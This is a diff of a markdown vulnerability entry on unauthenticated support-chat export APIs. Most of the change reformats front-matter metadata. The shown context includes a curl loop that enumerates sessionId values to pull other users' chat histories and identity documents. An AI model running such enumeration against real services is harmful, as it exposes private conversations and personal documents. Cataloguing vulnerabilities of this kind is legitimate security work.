@@ -1,18 +1,38 @@
 ﻿---
-title: Unauthenticated support-chat exports (site-wide conversations and identity documents)
-cve: None (business logic)
-severity: high
+id: "cs-chat-export-unauth"
+title: "Unauthenticated support-chat exports (site-wide conversations and identity documents)"
+kind: "business-logic"
+cve: null
+related-cves: null
+cve-note: "None (business logic)"
+severity: "high"
 cvss: 8.4
-product: Custom support system (live chat / tickets / IM)
-versions: Any
-ports: 80, 443
-keywords: support, chat history, export, unauthenticated, conversations, im
-entry: /api/cs/history/export  /api/im/sessions
+severity-basis: "cvss"
+severity-note: null
+product: "Custom support system (live chat / tickets / IM)"
+versions: "Any"
+ports: "80, 443"
+keywords: "support, chat history, export, unauthenticated, conversations, im"
+entry: "/api/cs/history/export /api/im/sessions"
 verified: false
-sources: Compiled from public sources (business logic; no CVE)
+verified-on: null
+verification-evidence: null
+source-url: null
+vendor-advisory: null
+cwe: null
+patch-date: null
+sources: "Compiled from public sources (business logic; no CVE)"
+kev: null
+kev-date: null
+kev-source: null
+epss: null
+epss-percentile: null
+epss-date: null
+epss-source: null
+enrichment-updated: null
 ---
 
-## Fingerprints
+## Fingerprinting
 
 ```
 GET /api/cs/sessions?page=1
@@ -37,7 +57,7 @@ curl -s 'https://target/api/cs/history?sessionId=10001' -H "Authorization: Beare
 
 # 3) Enumerate sessionId
 for i in $(seq 10001 10010); do
-  curl -s "https://target/api/cs/history?sessionId=$i" -H "Authorization: Bearer <t>" | head -c 80; echo
+ curl -s "https://target/api/cs/history?sessionId=$i" -H "Authorization: Bearer <t>" | head -c 80; echo
 done
 ```
 
@@ -55,4 +75,4 @@ done
 
 ## References
 
-- OWASP API1/API5；CWE-639。
+- OWASP API1/API5; CWE-639.
